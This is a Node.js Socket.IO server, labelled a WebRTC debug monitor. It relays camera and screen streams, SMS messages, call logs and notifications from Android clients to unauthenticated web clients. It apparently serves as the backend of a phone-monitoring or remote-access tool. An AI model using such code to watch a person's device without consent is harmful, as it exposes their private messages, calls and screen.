// WebRTC Debug Monitoring Script
// This script adds enhanced debugging for WebRTC streams

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

// Serve static files
const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));

// Enhanced logging
function log(category, message, data = null) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] [${category}] ${message}`;
  
  if (data) {
    console.log(logMessage, data);
  } else {
    console.log(logMessage);
  }
}

// Serve index.html for all routes
app.get('*', (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    console.error(`index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

// Enhanced client management with WebRTC debugging
class DebugClientManager {
  constructor() {
    this.webClients = new Map();
    this.androidClients = new Map();
    this.connections = new Map(); // Track active WebRTC connections
    this.signalHistory = new Map(); // Track signaling history
    this.streamStats = new Map(); // Track stream statistics
  }

  addWebClient(socketId, socket) {
    const client = {
      id: socketId,
      socket: socket,
      connectedAt: Date.now(),
      type: 'web'
    };
    this.webClients.set(socketId, client);
    log('CLIENT', `Web client connected: ${socketId}`);
    this.logConnectionStats();
  }

  addAndroidClient(socketId, socket) {
    const client = {
      id: socketId,
      socket: socket,
      connectedAt: Date.now(),
      type: 'android'
    };
    this.androidClients.set(socketId, client);
    log('CLIENT', `Android client connected: ${socketId}`);
    this.logConnectionStats();
  }

  removeClient(socketId) {
    const wasWeb = this.webClients.delete(socketId);
    const wasAndroid = this.androidClients.delete(socketId);
    
    // Clean up connection tracking
    this.connections.delete(socketId);
    this.signalHistory.delete(socketId);
    this.streamStats.delete(socketId);

    if (wasWeb) {
      log('CLIENT', `Web client disconnected: ${socketId}`);
      return 'web';
    } else if (wasAndroid) {
      log('CLIENT', `Android client disconnected: ${socketId}`);
      return 'android';
    }
    
    this.logConnectionStats();
    return null;
  }

  trackSignal(from, to, signal) {
    const key = `${from}-${to}`;
    if (!this.signalHistory.has(key)) {
      this.signalHistory.set(key, {
        from,
        to,
        signals: [],
        startTime: Date.now()
      });
    }
    
    const history = this.signalHistory.get(key);
    history.signals.push({
      type: signal.type || 'candidate',
      timestamp: Date.now(),
      hasVideo: signal.sdp ? signal.sdp.includes('m=video') : false,
      hasAudio: signal.sdp ? signal.sdp.includes('m=audio') : false,
      hasScreen: signal.sdp ? signal.sdp.includes('mid=screen') : false
    });

    if (signal.type === 'offer') {
      log('WEBRTC', `Offer from ${from} to ${to}`, {
        videoLines: signal.sdp ? (signal.sdp.match(/m=video/g) || []).length : 0,
        audioLines: signal.sdp ? (signal.sdp.match(/m=audio/g) || []).length : 0,
        sdpLength: signal.sdp ? signal.sdp.length : 0
      });
    } else if (signal.type === 'answer') {
      log('WEBRTC', `Answer from ${from} to ${to}`, {
        sdpLength: signal.sdp ? signal.sdp.length : 0
      });
    }
  }

  getConnectionStats() {
    const stats = {
      webClients: this.webClients.size,
      androidClients: this.androidClients.size,
      activeConnections: this.connections.size,
      totalSignals: Array.from(this.signalHistory.values())
        .reduce((total, history) => total + history.signals.length, 0)
    };
    return stats;
  }

  logConnectionStats() {
    const stats = this.getConnectionStats();
    log('STATS', 'Connection statistics', stats);
  }

  getWebClients() {
    return Array.from(this.webClients.values());
  }

  getAndroidClients() {
    return Array.from(this.androidClients.values());
  }
}

const clientManager = new DebugClientManager();

// WebRTC signal analysis
function analyzeSDPOffer(sdp) {
  const analysis = {
    videoTracks: 0,
    audioTracks: 0,
    hasCamera: false,
    hasScreen: false,
    codecs: {
      video: [],
      audio: []
    }
  };

  if (!sdp) return analysis;

  // Count media tracks
  const videoMatches = sdp.match(/m=video/g);
  const audioMatches = sdp.match(/m=audio/g);
  
  analysis.videoTracks = videoMatches ? videoMatches.length : 0;
  analysis.audioTracks = audioMatches ? audioMatches.length : 0;

  // Check for specific track types
  analysis.hasCamera = sdp.includes('camera') || analysis.videoTracks > 0;
  analysis.hasScreen = sdp.includes('screen') || sdp.includes('mid=2');

  // Extract codec information
  const rtpmapRegex = /a=rtpmap:\d+ ([^\/]+)/g;
  let match;
  while ((match = rtpmapRegex.exec(sdp)) !== null) {
    const codec = match[1].toLowerCase();
    if (['vp8', 'vp9', 'h264', 'av1'].includes(codec)) {
      analysis.codecs.video.push(codec);
    } else if (['opus', 'pcmu', 'pcma', 'g722'].includes(codec)) {
      analysis.codecs.audio.push(codec);
    }
  }

  return analysis;
}

// Socket.IO event handlers
io.on('connection', socket => {
  log('CONNECTION', `New client connected: ${socket.id}`, {
    address: socket.handshake.address,
    userAgent: socket.handshake.headers['user-agent']
  });

  socket.emit('id', socket.id);

  socket.on('identify', (type) => {
    try {
      log('IDENTIFY', `Client ${socket.id} identified as: ${type}`);
      
      if (type === 'web') {
        clientManager.addWebClient(socket.id, socket);
        socket.join('web');
        
        // Notify Android clients
        const androidClients = clientManager.getAndroidClients();
        androidClients.forEach(client => {
          client.socket.emit('web-client-ready', socket.id);
          log('NOTIFY', `Notified Android ${client.id} about web client ${socket.id}`);
        });
        
        // Notify web client about Android clients
        androidClients.forEach(client => {
          socket.emit('android-client-ready', client.id);
          log('NOTIFY', `Notified web ${socket.id} about Android client ${client.id}`);
        });
        
      } else if (type === 'android') {
        clientManager.addAndroidClient(socket.id, socket);
        socket.join('android');
        
        // Notify web clients
        const webClients = clientManager.getWebClients();
        webClients.forEach(client => {
          client.socket.emit('android-client-ready', socket.id);
          log('NOTIFY', `Notified web ${client.id} about Android client ${socket.id}`);
        });
        
        // Notify Android client about web clients
        webClients.forEach(client => {
          socket.emit('web-client-ready', client.id);
          log('NOTIFY', `Notified Android ${socket.id} about web client ${client.id}`);
        });
      }
      
    } catch (error) {
      log('ERROR', `Error in identify handler for ${socket.id}:`, error);
      socket.emit('error', { message: 'Failed to identify client', code: 'IDENTIFY_ERROR' });
    }
  });

  socket.on('signal', data => {
    try {
      const { from, to, signal } = data;
      
      if (!to || !signal) {
        log('ERROR', `Invalid signal data from ${socket.id}`, data);
        socket.emit('error', { message: 'Invalid signal data', code: 'INVALID_SIGNAL' });
        return;
      }

      // Track and analyze the signal
      clientManager.trackSignal(from, to, signal);

      // Enhanced logging for WebRTC signals
      if (signal.type === 'offer') {
        const analysis = analyzeSDPOffer(signal.sdp);
        log('WEBRTC', `Processing offer from ${from} to ${to}`, analysis);
        
        // Check if this looks like a complete media offer
        if (analysis.videoTracks === 0 && analysis.audioTracks === 0) {
          log('WARNING', 'Offer contains no media tracks!');
        }
      } else if (signal.type === 'answer') {
        log('WEBRTC', `Processing answer from ${from} to ${to}`, {
          sdpLength: signal.sdp ? signal.sdp.length : 0
        });
      } else if (signal.candidate) {
        log('ICE', `ICE candidate from ${from} to ${to}`, {
          type: signal.candidate.candidate.split(' ')[7] || 'unknown',
          protocol: signal.candidate.protocol,
          sdpMid: signal.candidate.sdpMid
        });
      }
      
      // Forward the signal
      const targetSocket = io.sockets.sockets.get(to);
      if (targetSocket) {
        targetSocket.emit('signal', data);
        log('RELAY', `Signal forwarded from ${from} to ${to}`);
      } else {
        log('ERROR', `Target client ${to} not found for signal from ${from}`);
        socket.emit('error', { message: 'Recipient not found', code: 'RECIPIENT_NOT_FOUND' });
      }
      
    } catch (error) {
      log('ERROR', `Error in signal handler for ${socket.id}:`, error);
      socket.emit('error', { message: 'Failed to relay signal', code: 'SIGNAL_ERROR' });
    }
  });

  // Data event handlers with minimal logging
  socket.on('sms', data => {
    try {
      const webClients = clientManager.getWebClients();
      if (webClients.length > 0) {
        io.to('web').emit('sms', data);
        log('DATA', `SMS broadcasted to ${webClients.length} web clients`);
      }
    } catch (error) {
      log('ERROR', `Error in SMS handler:`, error);
    }
  });

  socket.on('call-log', data => {
    try {
      const webClients = clientManager.getWebClients();
      if (webClients.length > 0) {
        io.to('web').emit('call-log', data);
        // Reduced logging for call logs
        if (Math.random() < 0.1) { // Log only 10% of call logs
          log('DATA', `Call log broadcasted to ${webClients.length} web clients`);
        }
      }
    } catch (error) {
      log('ERROR', `Error in call-log handler:`, error);
    }
  });

  socket.on('notification', data => {
    try {
      const webClients = clientManager.getWebClients();
      if (webClients.length > 0) {
        io.to('web').emit('notification', data);
        log('DATA', `Notification broadcasted to ${webClients.length} web clients`);
      }
    } catch (error) {
      log('ERROR', `Error in notification handler:`, error);
    }
  });

  socket.on('disconnect', (reason) => {
    log('DISCONNECT', `Client ${socket.id} disconnected: ${reason}`);
    
    try {
      const clientType = clientManager.removeClient(socket.id);
      
      if (clientType === 'android') {
        io.to('web').emit('android-client-disconnected', socket.id);
        log('NOTIFY', `Notified web clients of Android disconnection: ${socket.id}`);
      } else if (clientType === 'web') {
        io.to('android').emit('web-client-disconnected', socket.id);
        log('NOTIFY', `Notified Android clients of web disconnection: ${socket.id}`);
      }
      
    } catch (error) {
      log('ERROR', `Error in disconnect handler:`, error);
    }
  });

  socket.on('error', (error) => {
    log('SOCKET_ERROR', `Error from ${socket.id}:`, error);
  });

  // Health check handlers
  socket.on('ping', () => {
    socket.emit('pong');
  });

  // WebRTC-specific debug events
  socket.on('webrtc-stats', (stats) => {
    log('WEBRTC_STATS', `Stats from ${socket.id}:`, stats);
    clientManager.streamStats.set(socket.id, {
      ...stats,
      timestamp: Date.now()
    });
  });
});

// Server error handling
server.on('error', (error) => {
  log('SERVER_ERROR', 'Server error:', error);
  if (error.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is already in use. Please try a different port.`);
    process.exit(1);
  }
});

// Periodic health checks and statistics
setInterval(() => {
  const stats = clientManager.getConnectionStats();
  if (stats.webClients > 0 || stats.androidClients > 0) {
    log('HEALTH', 'Server health check', stats);
    
    // Log active WebRTC connections
    for (const [key, history] of clientManager.signalHistory.entries()) {
      const lastSignal = history.signals[history.signals.length - 1];
      if (lastSignal && Date.now() - lastSignal.timestamp < 30000) {
        log('ACTIVE_CONNECTION', `Active WebRTC connection: ${key}`, {
          duration: Date.now() - history.startTime,
          signalCount: history.signals.length
        });
      }
    }
  }
}, 30000);

// Debug API endpoints
app.get('/api/debug/stats', (req, res) => {
  const stats = {
    ...clientManager.getConnectionStats(),
    connections: Array.from(clientManager.signalHistory.entries()).map(([key, history]) => ({
      connection: key,
      startTime: history.startTime,
      signalCount: history.signals.length,
      lastSignal: history.signals[history.signals.length - 1]
    })),
    streamStats: Array.from(clientManager.streamStats.entries())
  };
  res.json(stats);
});

app.get('/api/debug/clients', (req, res) => {
  const clients = {
    web: clientManager.getWebClients().map(c => ({
      id: c.id,
      connectedAt: c.connectedAt,
      duration: Date.now() - c.connectedAt
    })),
    android: clientManager.getAndroidClients().map(c => ({
      id: c.id,
      connectedAt: c.connectedAt,
      duration: Date.now() - c.connectedAt
    }))
  };
  res.json(clients);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  log('SERVER', `Server running at http://localhost:${PORT}`);
  log('SERVER', `Debug API available at http://localhost:${PORT}/api/debug/stats`);
});

// Graceful shutdown
process.on('SIGINT', () => {
  log('SERVER', 'Shutting down server gracefully...');
  io.emit('server-shutdown', { message: 'Server is shutting down' });
  server.close(() => {
    log('SERVER', 'Server shut down gracefully');
    process.exit(0);
  });
});

process.on('uncaughtException', (error) => {
  log('CRITICAL', 'Uncaught Exception:', error);
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  log('CRITICAL', 'Unhandled Rejection:', { reason, promise });
});
